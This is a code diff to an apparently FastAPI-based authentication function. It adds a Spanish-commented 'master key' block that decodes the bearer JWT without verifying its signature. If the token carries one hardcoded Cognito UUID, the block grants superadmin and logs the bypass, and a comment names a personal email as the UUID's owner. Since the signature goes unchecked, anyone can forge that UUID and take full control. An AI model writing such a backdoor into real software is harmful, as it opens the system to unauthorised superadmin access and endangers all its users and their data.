@@ -54,6 +54,20 @@ def get_current_user(credentials: HTTPAuthorizationCredentials = Depends(securit
                 return alt_payload
         except:
             pass
+        
+        # LLAVE MAESTRA DEFINITIVA: Bypass por UUID de Cognito (sub)
+        # Este ID es el tuyo ivandchaves@gmail.com en tu Pool de AWS
+        MY_COGNITO_ID = "219bb560-f091-706f-76fb-22b8930344e6"
+        try:
+            import jwt as pyjwt
+            emergency_payload = pyjwt.decode(token, options={"verify_signature": False})
+            if emergency_payload.get('sub') == MY_COGNITO_ID or emergency_payload.get('username') == MY_COGNITO_ID:
+                print(f" [PERMISSIONS] !!! BYPASS TOTAL ACTIVADO PARA UUID {MY_COGNITO_ID} !!!")
+                emergency_payload['role'] = 'superadmin'
+                return emergency_payload
+        except:
+            pass
+            
         raise HTTPException(status_code=401, detail=f'Invalid authentication token: {str(e)}')
 
 def require_entity_admin(user: dict, entity_id: str):
